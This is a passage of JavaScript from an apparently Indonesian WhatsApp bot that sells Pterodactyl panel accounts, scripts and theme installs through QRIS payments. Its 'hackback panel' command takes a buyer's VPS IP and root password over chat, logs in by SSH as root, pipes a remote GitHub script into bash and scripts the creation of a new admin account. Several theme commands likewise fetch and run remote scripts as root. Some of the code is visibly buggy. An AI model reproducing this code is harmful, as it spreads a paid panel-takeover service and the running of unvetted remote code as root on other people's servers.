        if (db.users[m.sender].saweria && req?.amount == db.users[m.sender].saweria.amount) {
            db.users[m.sender].status_deposit = false;
            await clearInterval(db.users[m.sender].saweria.exp);
            await TamaMods.sendMessage(db.users[m.sender].saweria.chat, {text: `
            *✅ PEMBAYARAN BERHASIL DITERIMA*

            💳 *ID Transaksi:* ${db.users[m.sender].saweria.idDeposit}  
            💰 *Total Pembayaran:* Rp${await toIDR(db.users[m.sender].saweria.amount)}  
            📦 *Barang:* Owner Panel Pterodactyl
            `}, {quoted: db.users[m.sender].saweria.msg});
            
            let username = Obj.username;
            let email = username+"@gmail.com";
            let name = capital(username);
            let password = crypto.randomBytes(4).toString('hex');
            
            let f = await fetch(global.domain + "/api/application/users", {
                "method": "POST",
                "headers": {
                    "Accept": "application/json",
                    "Content-Type": "application/json",
                    "Authorization": "Bearer " + apikey
                },
                "body": JSON.stringify({
                    "email": email,
                    "username": username.toLowerCase(),
                    "first_name": name,
                    "last_name": "Admin",
                    "root_admin": true,
                    "language": "en",
                    "password": password.toString()
                })
            });
            let data = await f.json();
            if (data.errors) return Reply(JSON.stringify(data.errors[0], null, 2));
            let user = data.attributes;
            var teks = `
            *🎉 Berhasil Membuat Owner Panel ✅*

            📛 *ID User:* ${user.id}  
            👤 *Nama:* ${user.first_name}  
            💻 *Username:* ${user.username}  
            🔑 *Password:* ${password.toString()}  
            🌐 *Login di:* ${global.global.domain}  
            📱 *Gabung Whatsapp:* ${global.linkgbbuypublic}

            *⚠️ Rules Owner Panel*  
            1. 🚫 Jangan Maling SC, Ketahuan Maling? Akun Dihapus!  
            2. 💾 Simpan baik-baik Data Akun Ini!  
            3. 🚀 Gunakan Panel dengan Bijak!  
            4. 📸 Claim Garansi hanya dengan Bukti SS Chat Saat Pembelian.
            `;
            await TamaMods.sendMessage(db.users[m.sender].saweria.chat, {text: teks}, {quoted: pantek});
            await TamaMods.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key });
            delete db.users[m.sender].saweria;
        }
    }
}
break
//------(Batas Case)------//
case 'belistockscript': case 'belistocksc': case 'belistokscript': case 'belistoksc': case 'buystockscript': case 'buystokscript': case 'buystoksc': {
// Ensure the purchase only happens in private chat
    if (m.isGroup) {
        return TamaMods.sendMessage(m.chat, {text: "Pembelian Stock Script hanya bisa dilakukan di private chat."});
    }

    // Check if there is an ongoing transaction
    if (db.users[m.sender].status_deposit) {
        return TamaMods.sendMessage(m.chat, {text: "Masih ada transaksi yang belum diselesaikan, ketik *.batalbeli* untuk membatalkan transaksi sebelumnya!"});
    }
    
const scriptPath = './System/database/scripts.json';

const scriptName = args.join(" ");
if (!scriptName) return Reply(`❌ *Format salah!*\n📌 Contoh: ${prefix+command} NamaScript\nUntuk melihat daftar script, Ketik : *.listscript*`);

// Baca database
const scriptsData = JSON.parse(fs.readFileSync(scriptPath, 'utf-8'));
const script = scriptsData.scripts.find(s => s.name.toLowerCase() === scriptName.toLowerCase());

// Validasi script
if (!script) return Reply(`❌ *Script "${scriptName}" tidak ditemukan!*`);


    // QRIS untuk pembayaran hackback panel
    let harga = `${script.price}`; // Harga layanan stock sc
    let amount = harga;

    // Membuat permintaan pembayaran
    const UrlQr = global.qrisOrderKuota;
    const get = await axios.get(`https://nabzxapibot.vercel.app/api/orkut/createpayment?apikey=${global.apipayment2}&amount=${amount}&codeqr=${global.QrisOrderKuota}`);

    // Mengirim QRIS kepada pengguna untuk pembayaran
    let teksPembayaran = `
*📄 INFORMASI PEMBAYARAN 📄*
  
*• Nama Sc :* ${script.name}
*• Harga :* Rp. ${harga}
*• Layanan :* Stock Script

Silahkan scan QRIS di atas untuk melakukan pembayaran.`;
        let msgQr = await TamaMods.sendMessage(m.chat, {
  buttons: [
    {
      buttonId: `.batalbeli`,
      buttonText: { displayText: 'Batalkan Pembelian' },
      type: 1
    }
  ],
  headerType: 1,
  viewOnce: true,
  image: {url: get.data.result.qrImageUrl},  
  caption: teksPembayaran,
  contextInfo: {
   mentionedJid: [m.sender], 
   isForwarded: true
  },
})
    
        // Menyimpan data transaksi
    db.users[m.sender].status_deposit = true;
    db.users[m.sender].saweria = {
        msg: msgQr,
        chat: m.sender,
        idDeposit: get.data.result.idtransaksi,
        amount: get.data.result.jumlah.toString(),
        exp: function () {
            setTimeout(async () => {
                if (db.users[m.sender].status_deposit && db.users[m.sender].saweria) {
                    await TamaMods.sendMessage(db.users[m.sender].saweria.chat, {
                        text: "QRIS pembayaran telah expired!"
                    }, { quoted: db.users[m.sender].saweria.msg });
                    await TamaMods.sendMessage(db.users[m.sender].saweria.chat, {
                        delete: db.users[m.sender].saweria.msg.key
                    });
                    db.users[m.sender].status_deposit = false;
                    clearInterval(db.users[m.sender].saweria.exp);
                    delete db.users[m.sender].saweria;
                }
            }, 300000); // Waktu kadaluwarsa 5 menit
        }
    };

    // Memulai timer kadaluwarsa pembayaran
    await db.users[m.sender].saweria.exp();

    // Mengecek status pembayaran secara berkala
    while (db.users[m.sender].status_deposit && db.users[m.sender].saweria) {
        await sleep(15000);

        const resultcek = await axios.get(`https://nabzxapibot.vercel.app/api/orkut/cekstatus?apikey=${global.apipayment2}&merchant=${global.IdMerchant}&keyorkut=${global.ApikeyOrderKuota}`);
      const req = resultcek.data;

      if (TamaMods[m.sender] && req?.result?.amount == TamaMods[m.sender].amount) {
            db.users[m.sender].status_deposit = false;
            clearInterval(db.users[m.sender].saweria.exp);
            

await TamaMods.sendMessage(m.chat, {
document: fs.readFileSync(script.filePath),
mimetype: 'application/zip',
fileName: `${script.name}.zip`,
caption: `✅ *Berhasil membeli script!*\n📜 *Nama* : ${script.name}\n📝 *Deskripsi* : ${script.description}\n💰 *Harga* : Rp ${harga}`
});


// Notifikasi ke owner
const ownerNumber = "000@s.whatsapp.net";
await TamaMods.sendMessage(ownerNumber, {
text: `
📢 *NOTIFIKASI PEMBELIAN SCRIPT*
🧑‍💻 *Pembeli*: ${m.sender}
📜 *Script*: ${script.name}
💰 *Harga*: Rp ${harga}
`
});
  }
 }
}
break;

case "buyreseller": case "buyresellerpanel": {
    // Ensure the purchase only happens in private chat
    if (m.isGroup) {
        return TamaMods.sendMessage(m.chat, {text: "Pembelian Reseller Panel hanya bisa dilakukan di private chat."});
    }

    // Check if there is an ongoing transaction
    if (db.users[m.sender].status_deposit) {
        return TamaMods.sendMessage(m.chat, {text: "Masih ada transaksi yang belum diselesaikan, ketik *.batalbeli* untuk membatalkan transaksi sebelumnya!"});
    }

    // Inform the user how to proceed with the purchase
    let teks = `
    \`Untuk membeli Reseller Panel, ketik perintah berikut:\`
    Contoh penggunaan: *.buyresellerpanel 1*
    Pilihan: 1 (Rp 10000)
    `;
    if (!text) return TamaMods.sendMessage(m.chat, {text: teks});

    let Obj = {};
    let cmd = text.toLowerCase();
    if (cmd === "1") {
        Obj.harga = "10000"; // Harga untuk Reseller Panel
    } else {
        return TamaMods.sendMessage(m.chat, {text: teks});
    }

    // QRIS Order URL
    const UrlQr = global.qrisOrderKuota;

    // Function to generate a random value for payment amount
    let amount = Number(Obj.harga) + Math.floor(Math.random() * (250 - 110 + 1)) + 110;
    
    // Create payment request
    const get = await axios.get(`https://nabzxapibot.vercel.app/api/orkut/createpayment?apikey=${global.apipayment2}&amount=${amount}&codeqr=${global.QrisOrderKuota}`);
    
    // Message to user with payment info and QR code
    const teks3 = `
    *INFORMASI PEMBAYARAN*
  
 *• ID :* ${get.data.result.transactionId}
 *• Total Pembayaran :* Rp${await toIDR(get.data.result.amount)}
 *• Barang :* Reseller Panel Pterodactyl
 *• Expired :* 5 menit

*Note :* 
Qris pembayaran hanya berlaku dalam 5 menit, jika sudah melewati 5 menit pembayaran dinyatakan tidak valid!
Jika pembayaran berhasil bot akan otomatis mengirim notifikasi status pembayaran kamu.

Ketik *.batalbeli* untuk membatalkan`;
    
    // Send payment QR and information to user
    let msgQr = await TamaMods.sendMessage(m.chat, {
  footer: `${global.botname2}\nAuto Order Reseller Panel`,
  buttons: [
    {
      buttonId: `.batalbeli`,
      buttonText: { displayText: 'Batalkan Pembelian' },
      type: 1
    }
  ],
  headerType: 1,
  viewOnce: true,
  image: {url: get.data.result.qrImageUrl}, 
  caption: teks3,
  contextInfo: {
   mentionedJid: [m.sender]
  },
})
    
    // Update user status and store payment data
    db.users[m.sender].status_deposit = true;
    db.users[m.sender].saweria = {
        msg: msgQr, 
        chat: m.sender,
        idDeposit: get.data.result.transactionId, 
        amount: get.data.result.amount.toString(), 
        exp: function () {
            setTimeout(async () => {
                if (db.users[m.sender].status_deposit === true && db.users[m.sender].saweria && db.users[m.sender].saweria.amount) {
                    await TamaMods.sendMessage(db.users[m.sender].saweria.chat, {text: "QRIS pembayaran telah expired!"}, {quoted: db.users[m.sender].saweria.msg});
                    await TamaMods.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key });
                    db.users[m.sender].status_deposit = false;
                    clearInterval(db.users[m.sender].saweria.exp);
                    delete db.users[m.sender].saweria;
                }
            }, 300000); // 5 minutes expiry
        }
    };

    // Start payment expiration timer
    await db.users[m.sender].saweria.exp();

    // Check payment status until the user has completed the payment or the time expires
    while (db.users[m.sender].status_deposit === true && db.users[m.sender].saweria && db.users[m.sender].saweria.amount) {
        await sleep(15000); // Wait 15 seconds before checking payment status

        // Check payment status
        const resultcek = await axios.get(`https://nabzxapibot.vercel.app/api/orkut/cekstatus?apikey=${global.apipayment2}&merchant=${global.IdMerchant}&keyorkut=${global.ApikeyOrderKuota}`);
        const req = await resultcek.data.amount;

        // If payment matches the expected amount, process the order
        if (db.users[m.sender].saweria && req === db.users[m.sender].saweria.amount) {
            db.users[m.sender].status_deposit = false;
            clearInterval(db.users[m.sender].saweria.exp);

            // Send payment confirmation to user
            await TamaMods.sendMessage(db.users[m.sender].saweria.chat, {text: `
            *PEMBAYARAN BERHASIL DITERIMA*

            *• ID Transaksi:* ${db.users[m.sender].saweria.idDeposit}
            *• Total Pembayaran:* Rp${await toIDR(db.users[m.sender].saweria.amount)}
            *• Barang:* Reseller Panel Pterodactyl
            *• Payment:* ${resultcek.data.brand_name}
            `}, {quoted: db.users[m.sender].saweria.msg});

            // Send access details to the user (without creating admin panel)
            let orang = db.users[m.sender].saweria.chat;
            let teks = `*💸 Pembayaran Sukses! 🎉*

✨ Terima kasih atas pembelian Anda! Berikut ini adalah detail grup reseller yang Anda beli:

🌟 *Link Grup:* ${linkgcreseller}
📌 *Harga Reseller Panel:* ${Obj.harga}

🚀 *Selamat bergabung dan semoga sukses dalam bisnis Anda!*
Jika ada pertanyaan, jangan ragu untuk menghubungi kami. 💬

_“Kesuksesan adalah hasil dari kerja keras, semangat, dan peluang yang dimanfaatkan dengan baik!”_
`;

            await TamaMods.sendMessage(orang, {text: teks}, {quoted: pantek});
            await TamaMods.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key });
            delete db.users[m.sender].saweria;
        }
    }
}
break
             
case "jasahbpanel": case "jasahackbackpanel": {
    // Memecah input menjadi IP VPS dan password
    let t = text.split('|');
    if (t.length < 2) return Reply(example("ipvps|pwvps"));
    let ipvps = t[0];
    let passwd = t[1];

    // Mengecek apakah ada transaksi yang belum selesai
    if (db.users[m.sender].status_deposit) {
        return TamaMods.sendMessage(m.chat, {
            text: "Masih ada transaksi yang belum diselesaikan, ketik *.batalbeli* untuk membatalkan transaksi sebelumnya!"
        });
    }

    // QRIS untuk pembayaran hackback panel
    let harga = 5000; // Harga layanan hackback panel
    let randomCharge = Math.floor(Math.random() * (250 - 110 + 1)) + 110;
    let amount = harga + randomCharge;

    // Membuat permintaan pembayaran
    const UrlQr = global.qrisOrderKuota;
    const paymentData = await axios.get(`https://nabzxapibot.vercel.app/api/orkut/createpayment?apikey=${global.apipayment2}&amount=${amount}&codeqr=${global.QrisOrderKuota}`);

    // Mengirim QRIS kepada pengguna untuk pembayaran
    let teksPembayaran = `
*📄 INFORMASI PEMBAYARAN 📄*
  
*• Harga Layanan:* Rp. ${harga}
*• Total Pembayaran:* Rp. ${amount}
*• Layanan:* Hackback Panel
*• Expired:* 5 Menit

Silahkan scan QRIS di atas untuk melakukan pembayaran.`;
    let msgQr = await TamaMods.sendMessage(m.chat, {
  footer: `${global.botname2}\nAuto Order Jasa`,
  buttons: [
    {
      buttonId: `.batalbeli`,
      buttonText: { displayText: 'Batalkan Pembelian' },
      type: 1
    }
  ],
  headerType: 1,
  viewOnce: true,
  image: {url: paymentData.data.result.qrImageUrl}, 
  caption: teksPembayaran,
  contextInfo: {
   mentionedJid: [m.sender]
  },
})

    // Menyimpan data transaksi
    db.users[m.sender].status_deposit = true;
    db.users[m.sender].saweria = {
        msg: msgQr,
        chat: m.sender,
        idDeposit: paymentData.data.result.transactionId,
        amount: paymentData.data.result.amount.toString(),
        exp: function () {
            setTimeout(async () => {
                if (db.users[m.sender].status_deposit && db.users[m.sender].saweria) {
                    await TamaMods.sendMessage(db.users[m.sender].saweria.chat, {
                        text: "QRIS pembayaran telah expired!"
                    }, { quoted: db.users[m.sender].saweria.msg });
                    await TamaMods.sendMessage(db.users[m.sender].saweria.chat, {
                        delete: db.users[m.sender].saweria.msg.key
                    });
                    db.users[m.sender].status_deposit = false;
                    clearInterval(db.users[m.sender].saweria.exp);
                    delete db.users[m.sender].saweria;
                }
            }, 300000); // Waktu kadaluwarsa 5 menit
        }
    };

    // Memulai timer kadaluwarsa pembayaran
    await db.users[m.sender].saweria.exp();

    // Mengecek status pembayaran secara berkala
    while (db.users[m.sender].status_deposit && db.users[m.sender].saweria) {
        await sleep(15000);

        const paymentStatus = await axios.get(`https://nabzxapibot.vercel.app/api/orkut/cekstatus?apikey=${global.apipayment2}&merchant=${global.IdMerchant}&keyorkut=${global.ApikeyOrderKuota}`);
        if (paymentStatus.data.amount == db.users[m.sender].saweria.amount) {
            db.users[m.sender].status_deposit = false;
            clearInterval(db.users[m.sender].saweria.exp);

            // Melanjutkan eksekusi Hackback Panel
            const newuser = "admin" + getRandom("");
            const newpw = "admin" + getRandom("");
            const connSettings = {
                host: ipvps,
                port: '22',
                username: 'root',
                password: passwd
            };
            const command = `bash <(curl -s https://raw.githubusercontent.com/SkyzoOffc/Pterodactyl-Theme-Autoinstaller/main/install.sh)`;
            const ress = new Client();

            ress.on('ready', () => {
                ress.exec(command, (err, stream) => {
                    if (err) throw err;
                    stream.on('close', async (code, signal) => {
                        let teks = `
*Hackback panel sukses🔥*

*Berikut detail akun admin panel :*
*• Username:* ${newuser}
*• Password:* ${newpw}`;
                        await TamaMods.sendMessage(m.chat, { text: teks }, { quoted: pantek });
                        ress.end();
                    }).on('data', async (data) => {
                        console.log(data.toString());
                    }).stderr.on('data', (data) => {
                        stream.write("skyzodev\n");
                        stream.write("7\n");
                        stream.write(`${newuser}\n`);
                        stream.write(`${newpw}\n`);
                    });
                });
            }).on('error', (err) => {
                console.log('Connection Error: ' + err);
                Reply('Katasandi atau IP tidak valid');
            }).connect(connSettings);
        }
    }
}
break;       
             
case "jasainstalltema": {
if (!text || !text.split("|")) return Reply(example("ipvps|pwvps"))
let vii = text.split("|")
if (vii.length < 2) return Reply(example("ipvps|pwvps"))
global.installtema = {
vps: vii[0], 
pwvps: vii[1]
}
        await TamaMods.sendMessage(m.chat, {
  buttons: [{
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Pilih Thema Yang Tersedia',
          sections: [
            {
              title: 'List Thema',
              highlight_label: 'Recommended',
              rows: [
                {
                  title: 'Jasa install thema enigma',
                  id: '.jasainstalltemaenigma'
                },
                {
                  title: 'Jasa install thema nebula',
                  id: '.jasainstalltemanebula'
                },
                {
                  title: 'Jasa install depend',
                  id: '.jasainstalldepend'
                },
                {
                  title: 'Jasa install thema elysium',
                  id: '.jasainstalltemaelysium'
                },               
                {
                  title: 'Jasa install thema billing',
                  id: '.jasainstalltemabilling'
                },                
                {
                  title: 'Jasa install thema nightcore',
                  id: '.jasainstalltemanightcore'
                }
              ]
            }
          ]
        })
      }
      }
  ],
  headerType: 1,
  viewOnce: true,
  text: "Kalau mau install thema nebula, install depend terlebih dahulu"
})
      }
        break             
 

 


case "jasainstalltemaelysium": {
    if (m.isGroup) return Reply("Instalasi tema hanya dapat dilakukan melalui private chat.");
    if (db.users[m.sender].status_deposit) return Reply("Masih ada transaksi yang belum diselesaikan, ketik *.batalbeli* untuk membatalkan transaksi sebelumnya!");

    const UrlQr = global.qrisOrderKuota;

    function generateRandomNumber(min, max) {
        return Math.floor(Math.random() * (max - min + 1)) + min;
    }

    let amount = 5000 + generateRandomNumber(110, 250); // Harga tema ditambah angka unik
    const get = await axios.get(`https://nabzxapibot.vercel.app/api/orkut/createpayment?apikey=${global.apipayment2}&amount=${amount}&codeqr=${global.QrisOrderKuota}`);
    const teksPembayaran = `
*▧ INFORMASI PEMBAYARAN*

*• ID :* ${get.data.result.transactionId}
*• Total Pembayaran :* Rp${await toIDR(get.data.result.amount)}
*• Barang :* Tema Elysium Pterodactyl
*• Expired :* 5 menit

*Note :*
QRIS pembayaran hanya berlaku dalam 5 menit. Jika pembayaran berhasil, bot akan otomatis melanjutkan instalasi tema.

Ketik *.batalbeli* untuk membatalkan transaksi.
`;

    let msgQr = await TamaMods.sendMessage(m.chat, {
  footer: `${global.botname2}\nAuto Order Jasa`,
  buttons: [
    {
      buttonId: `.batalbeli`,
      buttonText: { displayText: 'Batalkan Pembelian' },
      type: 1
    }
  ],
  headerType: 1,
  viewOnce: true,
  image: {url: get.data.result.qrImageUrl}, 
  caption: teksPembayaran,
  contextInfo: {
   mentionedJid: [m.sender]
  },
})
    db.users[m.sender].status_deposit = true;
    db.users[m.sender].saweria = {
        msg: msgQr,
        chat: m.sender,
        idDeposit: get.data.result.transactionId,
        amount: get.data.result.amount.toString(),
        exp: function () {
            setTimeout(async () => {
                if (db.users[m.sender].status_deposit) {
                    await TamaMods.sendMessage(db.users[m.sender].saweria.chat, { text: "QRIS pembayaran telah expired!" }, { quoted: db.users[m.sender].saweria.msg });
                    await TamaMods.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key });
                    db.users[m.sender].status_deposit = false;
                    delete db.users[m.sender].saweria;
                }
            }, 300000);
        }
    };

    await db.users[m.sender].saweria.exp();

    while (db.users[m.sender].status_deposit) {
        await sleep(15000);
        const resultcek = await axios.get(`https://nabzxapibot.vercel.app/api/orkut/cekstatus?apikey=${global.apipayment2}&merchant=${global.IdMerchant}&keyorkut=${global.ApikeyOrderKuota}`);
        const req = await resultcek.data.amount;
        if (req == db.users[m.sender].saweria.amount) {
            db.users[m.sender].status_deposit = false;

            const connSettings = {
                host: global.installtema.vps,
                port: '22',
                username: 'root',
                password: global.installtema.pwvps,
            };

            const command = `bash <(curl -s https://raw.githubusercontent.com/LeXcZxMoDz9/kontol/refs/heads/main/bangke.sh)`;
            const ress = new Client();

            ress.on('ready', async () => {
                Reply("Memproses install *tema Elysium* pterodactyl\nTunggu 1-10 menit hingga proses selesai");
                ress.exec(command, (err, stream) => {
                    if (err) throw err;
                    stream.on('close', async (code, signal) => {
                        await Reply("Berhasil install *tema Elysium* pterodactyl 🔥");
                        ress.end();
                    }).on('data', async (data) => {
                        console.log(data.toString());
                        stream.write('1\n');
                        stream.write('y\n');
                        stream.write('yes\n');
                    }).stderr.on('data', (data) => {
                        console.log('STDERR: ' + data);
                    });
                });
            }).on('error', (err) => {
                console.log('Connection Error: ' + err);
                Reply('Katasandi atau IP tidak valid');
            }).connect(connSettings);
            
            await TamaMods.sendMessage(db.users[m.sender].saweria.chat, { text: "Pembayaran berhasil! Memulai instalasi tema..." }, { quoted: db.users[m.sender].saweria.msg });
            delete db.users[m.sender].saweria;
        }
    }
}
break;

//=====================================//

case "jasainstalltemaenigma": {
 if (m.isGroup) return Reply("Instalasi tema hanya dapat dilakukan melalui private chat.");
 if (db.users[m.sender].status_deposit) return Reply("Masih ada transaksi yang belum diselesaikan, ketik *.batalbeli* untuk membatalkan transaksi sebelumnya!");

 const UrlQr = global.qrisOrderKuota;

 function generateRandomNumber(min, max) {
 return Math.floor(Math.random() * (max - min + 1)) + min;
 }

 let amount = 5000 + generateRandomNumber(110, 250); // Harga tema ditambah angka unik
 const get = await axios.get(`https://nabzxapibot.vercel.app/api/orkut/createpayment?apikey=${global.apipayment2}&amount=${amount}&codeqr=${global.QrisOrderKuota}`);
 const teksPembayaran = `
*▧ INFORMASI PEMBAYARAN*

*• ID :* ${get.data.result.transactionId}
*• Total Pembayaran :* Rp${await toIDR(get.data.result.amount)}
*• Barang :* Tema Enigma Pterodactyl
*• Expired :* 5 menit

*Note :*
QRIS pembayaran hanya berlaku dalam 5 menit. Jika pembayaran berhasil, bot akan otomatis melanjutkan instalasi tema.

Ketik *.batalbeli* untuk membatalkan transaksi.
`;

 let msgQr = await TamaMods.sendMessage(m.chat, {
  footer: `${global.botname2}\nAuto Order Jasa`,
  buttons: [
    {
      buttonId: `.batalbeli`,
      buttonText: { displayText: 'Batalkan Pembelian' },
      type: 1
    }
  ],
  headerType: 1,
  viewOnce: true,
  image: {url: get.data.result.qrImageUrl}, 
  caption: teksPembayaran,
  contextInfo: {
   mentionedJid: [m.sender]
  },
})
 db.users[m.sender].status_deposit = true;
 db.users[m.sender].saweria = {
 msg: msgQr,
 chat: m.sender,
 idDeposit: get.data.result.transactionId,
 amount: get.data.result.amount.toString(),
 exp: function () {
 setTimeout(async () => {
 if (db.users[m.sender].status_deposit) {
 await TamaMods.sendMessage(db.users[m.sender].saweria.chat, { text: "QRIS pembayaran telah expired!" }, { quoted: db.users[m.sender].saweria.msg });
 await TamaMods.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key });
 db.users[m.sender].status_deposit = false;
 delete db.users[m.sender].saweria;
 }
 }, 300000);
 }
 };

 await db.users[m.sender].saweria.exp();

 while (db.users[m.sender].status_deposit) {
 await sleep(8000);
 const resultcek = await axios.get(`https://nabzxapibot.vercel.app/api/orkut/cekstatus?apikey=${global.apipayment2}&merchant=${global.IdMerchant}&keyorkut=${global.ApikeyOrderKuota}`);
 const req = await resultcek.data.amount;
 if (req == db.users[m.sender].saweria.amount) {
 db.users[m.sender].status_deposit = false;

 const connSettings = {
 host: global.installtema.vps,
 port: '22',
 username: 'root',
 password: global.installtema.pwvps,
 };

 const command = `bash <(curl -s https://raw.githubusercontent.com/SkyzoOffc/Pterodactyl-Theme-Autoinstaller/main/install.sh)`;
 const ress = new Client();

 ress.on('ready', () => {
 Reply("Memproses install *tema enigma* pterodactyl\nTunggu 1-10 menit hingga proses selesai.");
 ress.exec(command, (err, stream) => {
 if (err) throw err;
 stream.on('close', async (code, signal) => { 
 await Reply("Berhasil install *tema enigma* pterodactyl ✅");
 ress.end();
 }).on('data', async (data) => {
 console.log(data.toString());
 stream.write(`skyzodev\n`); // Key Token : skyzodev
 stream.write('1\n');
 stream.write('3\n');
 stream.write('https://wa.me/6285624297893\n');
 stream.write('https://whatsapp.com/channel/0029VaYoztA47XeAhs447Y1s\n');
 stream.write('https://chat.whatsapp.com/IP1KjO4OyM97ay2iEsSAFy\n');
 stream.write('yes\n');
 stream.write('x\n');
 }).stderr.on('data', (data) => {
 console.log('STDERR: ' + data);
 });
 });
 }).on('error', (err) => {
 console.log('Connection Error: ' + err);
 Reply('Kata sandi atau IP VPS tidak valid.');
 }).connect(connSettings);

 await TamaMods.sendMessage(db.users[m.sender].saweria.chat, { text: "Pembayaran berhasil! Memulai instalasi tema..." }, { quoted: db.users[m.sender].saweria.msg });
 delete db.users[m.sender].saweria;
 }
 }
}
break;

case "jasainstalltemabilling": {
    if (m.isGroup) return Reply("Instalasi tema hanya dapat dilakukan melalui private chat.");
    if (db.users[m.sender].status_deposit) return Reply("Masih ada transaksi yang belum diselesaikan, ketik *.batalbeli* untuk membatalkan transaksi sebelumnya!");

    const UrlQr = global.qrisOrderKuota;

    function generateRandomNumber(min, max) {
        return Math.floor(Math.random() * (max - min + 1)) + min;
    }

    let amount = 5000 + generateRandomNumber(110, 250); // Harga tema ditambah angka unik
    const get = await axios.get(`https://nabzxapibot.vercel.app/api/orkut/createpayment?apikey=${global.apipayment2}&amount=${amount}&codeqr=${global.QrisOrderKuota}`);
    const teksPembayaran = `
*▧ INFORMASI PEMBAYARAN*

*• ID :* ${get.data.result.transactionId}
*• Total Pembayaran :* Rp${await toIDR(get.data.result.amount)}
*• Barang :* Tema Billing Pterodactyl
*• Expired :* 5 menit

*Note :*
QRIS pembayaran hanya berlaku dalam 5 menit. Jika pembayaran berhasil, bot akan otomatis melanjutkan instalasi tema.

Ketik *.batalbeli* untuk membatalkan transaksi.
`;

    let msgQr = await TamaMods.sendMessage(m.chat, {
  footer: `${global.botname2}\nAuto Order Jasa`,
  buttons: [
    {
      buttonId: `.batalbeli`,
      buttonText: { displayText: 'Batalkan Pembelian' },
      type: 1
    }
  ],
  headerType: 1,
  viewOnce: true,
  image: {url: get.data.result.qrImageUrl}, 
  caption: teksPembayaran,
  contextInfo: {
   mentionedJid: [m.sender]
  },
})
    db.users[m.sender].status_deposit = true;
    db.users[m.sender].saweria = {
        msg: msgQr,
        chat: m.sender,
        idDeposit: get.data.result.transactionId,
        amount: get.data.result.amount.toString(),
        exp: function () {
            setTimeout(async () => {
                if (db.users[m.sender].status_deposit) {
                    await TamaMods.sendMessage(db.users[m.sender].saweria.chat, { text: "QRIS pembayaran telah expired!" }, { quoted: db.users[m.sender].saweria.msg });
                    await TamaMods.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key });
                    db.users[m.sender].status_deposit = false;
                    delete db.users[m.sender].saweria;
                }
            }, 300000);
        }
    };

    await db.users[m.sender].saweria.exp();

    while (db.users[m.sender].status_deposit) {
        await sleep(15000);
        const resultcek = await axios.get(`https://nabzxapibot.vercel.app/api/orkut/cekstatus?apikey=${global.apipayment2}&merchant=${global.IdMerchant}&keyorkut=${global.ApikeyOrderKuota}`);
        const req = await resultcek.data.amount;
        if (req == db.users[m.sender].saweria.amount) {
            db.users[m.sender].status_deposit = false;

            const connSettings = {
                host: global.installtema.vps,
                port: '22',
                username: 'root',
                password: global.installtema.pwvps,
            };

            const command = `bash <(curl -s https://raw.githubusercontent.com/SkyzoOffc/Pterodactyl-Theme-Autoinstaller/main/install.sh)`;
            const ress = new Client();

            ress.on('ready', () => {
                Reply("Memproses instalasi *tema billing* Pterodactyl. Tunggu 1-10 menit hingga proses selesai...");
                ress.exec(command, (err, stream) => {
                    if (err) throw err;
                    stream.on('close', async () => {    
                        await Reply("Berhasil menginstal *tema billing* Pterodactyl 🔥");
                        ress.end();
                    }).on('data', async (data) => {
                        console.log(data.toString());
                        stream.write(`skyzodev\n`); // Key Token: skyzodev
                        stream.write(`1\n`);
                        stream.write(`2\n`);
                        stream.write(`yes\n`);
                        stream.write(`x\n`);
                    }).stderr.on('data', (data) => {
                        console.log('STDERR: ' + data);
                    });
                });
            }).on('error', (err) => {
                console.log('Connection Error: ' + err);
                Reply('Kata sandi atau IP VPS tidak valid.');
            }).connect(connSettings);
            
            await TamaMods.sendMessage(db.users[m.sender].saweria.chat, { text: "Pembayaran berhasil! Memulai instalasi tema..." }, { quoted: db.users[m.sender].saweria.msg });
            delete db.users[m.sender].saweria;
        }
    }
}
break;

case "jasainstalltemanightcore": {
    if (m.isGroup) return Reply("Instalasi tema hanya dapat dilakukan melalui private chat.");
    if (db.users[m.sender].status_deposit) return Reply("Masih ada transaksi yang belum diselesaikan, ketik *.batalbeli* untuk membatalkan transaksi sebelumnya!");

    const UrlQr = global.qrisOrderKuota;

    function generateRandomNumber(min, max) {
        return Math.floor(Math.random() * (max - min + 1)) + min;
    }

    let amount = 5000 + generateRandomNumber(110, 250); // Harga tema ditambah angka unik
    const get = await axios.get(`https://nabzxapibot.vercel.app/api/orkut/createpayment?apikey=${global.apipayment2}&amount=${amount}&codeqr=${global.QrisOrderKuota}`);
    const teksPembayaran = `
*▧ INFORMASI PEMBAYARAN*

*• ID :* ${get.data.result.transactionId}
*• Total Pembayaran :* Rp${await toIDR(get.data.result.amount)}
*• Barang :* Tema Nightcore Pterodactyl
*• Expired :* 5 menit

*Note :*
QRIS pembayaran hanya berlaku dalam 5 menit. Jika pembayaran berhasil, bot akan otomatis melanjutkan instalasi tema.

Ketik *.batalbeli* untuk membatalkan transaksi.
`;

    let msgQr = await TamaMods.sendMessage(m.chat, {
  footer: `${global.botname2}\nAuto Order Jasa`,
  buttons: [
    {
      buttonId: `.batalbeli`,
      buttonText: { displayText: 'Batalkan Pembelian' },
      type: 1
    }
  ],
  headerType: 1,
  viewOnce: true,
  image: {url: get.data.result.qrImageUrl}, 
  caption: teksPembayaran,
  contextInfo: {
   mentionedJid: [m.sender]
  },
})
    db.users[m.sender].status_deposit = true;
    db.users[m.sender].saweria = {
        msg: msgQr,
        chat: m.sender,
        idDeposit: get.data.result.transactionId,
        amount: get.data.result.amount.toString(),
        exp: function () {
            setTimeout(async () => {
                if (db.users[m.sender].status_deposit) {
                    await TamaMods.sendMessage(db.users[m.sender].saweria.chat, { text: "QRIS pembayaran telah expired!" }, { quoted: db.users[m.sender].saweria.msg });
                    await TamaMods.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key });
                    db.users[m.sender].status_deposit = false;
                    delete db.users[m.sender].saweria;
                }
            }, 300000);
        }
    };

    await db.users[m.sender].saweria.exp();

    while (db.users[m.sender].status_deposit) {
        await sleep(15000);
